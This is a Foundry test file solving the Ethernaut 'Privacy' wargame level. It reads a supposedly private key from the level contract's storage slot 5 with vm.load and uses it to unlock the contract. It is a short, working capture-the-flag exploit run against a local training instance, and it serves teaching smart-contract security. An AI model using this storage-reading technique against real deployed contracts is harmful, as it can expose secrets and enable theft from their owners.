// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {PrivacyFactory} from "../src/levels/12-PrivacyFactory.sol";
import {Privacy} from "../src/levels/12-Privacy.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract PrivacySolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    PrivacyFactory internal factory;

    function solution(Privacy target) internal {
        bytes32 keyWord = vm.load(address(target), bytes32(uint256(5)));
        target.unlock(bytes16(keyWord));
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new PrivacyFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Privacy privacyContract = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(privacyContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
